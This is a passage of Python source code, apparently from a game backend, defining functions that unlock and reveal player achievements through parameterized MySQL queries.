    return dict(current_steps=new_current_steps, current_state=new_state, newly_unlocked=newly_unlocked)


def unlock_achievement(achievement_id, player_id):
    """Unlocks a standard achievement. This function is NOT an endpoint.

    :param achievement_id: ID of the achievement to unlock
    :param player_id: ID of the player to unlock the achievement for

    :return:
        If successful, this method returns a dictionary with the following structure::

            {
              "newly_unlocked": boolean,
            }
    """
    newly_unlocked = False

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)

        cursor.execute('SELECT type FROM achievement_definitions WHERE id = %s', achievement_id)
        achievement = cursor.fetchone()
        if achievement['type'] != 'STANDARD':
            raise InvalidUsage('Only standard achievements can be unlocked directly', status_code=400)

        cursor.execute("""SELECT
                            state
                        FROM player_achievements
                        WHERE achievement_id = %s AND player_id = %s""",
                       (achievement_id, player_id))

        player_achievement = cursor.fetchone()

        new_state = 'UNLOCKED'
        newly_unlocked = not player_achievement or player_achievement['state'] != 'UNLOCKED'

        cursor.execute("""INSERT INTO player_achievements (player_id, achievement_id, state)
                        VALUES
                            (%(player_id)s, %(achievement_id)s, %(state)s)
                        ON DUPLICATE KEY UPDATE
                            state = VALUES(state)""",
                       {
                           'player_id': player_id,
                           'achievement_id': achievement_id,
                           'state': new_state,
                       })

    return dict(newly_unlocked=newly_unlocked)


def reveal_achievement(achievement_id, player_id):
    """Reveals an achievement.

    :param achievement_id: ID of the achievement to unlock
    :param player_id: ID of the player to reveal the achievement for

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "current_state": string,
            }
    """
    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute("""SELECT
                            state
                        FROM player_achievements
                        WHERE achievement_id = %s AND player_id = %s""",
                       (achievement_id, player_id))

        player_achievement = cursor.fetchone()

        new_state = player_achievement['state'] if player_achievement else 'REVEALED'

        cursor.execute("""INSERT INTO player_achievements (player_id, achievement_id, state)
                        VALUES
                            (%(player_id)s, %(achievement_id)s, %(state)s)
                        ON DUPLICATE KEY UPDATE
                            state = VALUES(state)""",
                       {
                           'player_id': player_id,
                           'achievement_id': achievement_id,
                           'state': new_state,
                       })

    return dict(current_state=new_state)

